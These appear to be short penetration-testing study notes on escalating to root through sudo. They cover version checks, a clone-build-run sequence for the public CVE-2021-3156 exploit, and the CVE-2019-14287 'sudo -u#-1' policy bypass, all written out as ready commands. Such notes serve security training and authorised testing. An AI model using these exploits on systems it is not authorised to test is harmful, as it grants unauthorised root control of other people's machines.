**Check Sudoers file
```shell-session
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Vulnerable sudo versions:
- 1.8.31 Ubuntu 20.04
- 1.8.27 Debian 10
- 1.9.2 Fedora 33

**Find version of sudo
```shell-session
sudo -V | head -n1
```

**Find version of operating system
```shell-session
cat /etc/lsb-release
```

**Version 1.8.31 vulnerability
```shell-session
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 1
```
- Based on OS the number will change

## Sudo Policy Bypass

Version 1.8.28 is vulnerable
- CVE-2019-14287, only requires a user in the /etc/sudoers file to execute a specific command
```shell-session
sudo -l
cat /etc/passwd | grep cry0l1t3
```
- This user is id 1005

**Specify id as negative number to obtain root
```shell-session
sudo -u#-1 id
```

